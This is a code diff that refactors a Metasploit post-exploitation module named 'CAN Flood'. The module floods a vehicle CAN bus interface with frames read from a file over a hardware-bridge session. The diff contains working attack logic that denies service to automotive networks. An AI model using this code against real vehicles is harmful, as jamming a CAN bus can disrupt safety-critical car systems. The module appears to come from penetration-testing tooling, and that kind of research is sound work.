@@ -7,11 +7,10 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        'Name' => 'can_flood',
+        'Name' => 'CAN Flood',
         'Description' => 'Module that floods a CAN interface',
         'License' => MSF_LICENSE,
         'Author' => ['Pietro Biondi'],
-        'DisclosureDate' => ['March 20 2019'],
         'Platform' => ['hardware'],
         'SessionTypes' => ['hwbridge']
       )
@@ -26,17 +25,17 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    print_status(' -- OPENING FRAMELIST FILE --')
+    vprint_status("Reading frame list file: #{datastore['FRAMELIST']}")
     unless ::File.exist? datastore['FRAMELIST']
       print_error "Frame list file '#{datastore['FRAMELIST']}' does not exist"
       return
     end
     lines = File.readlines(datastore['FRAMELIST']).map { |line| line.strip }
     print_status(' -- FLOODING -- ')
-    (0..datastore['ROUND_NUMBER']).each do
-      for i in 0..lines.length - 1
-        frame = lines.map { |s| s.split('+') }
-        client.automotive.cansend(datastore['CANBUS'], frame[i][0], frame[i][1])
+    (datastore['ROUND_NUMBER']).times do
+      lines.each do |line|
+        frame = line.split('+')
+        client.automotive.cansend(datastore['CANBUS'], frame[0], frame[1])
       end
     end
   end
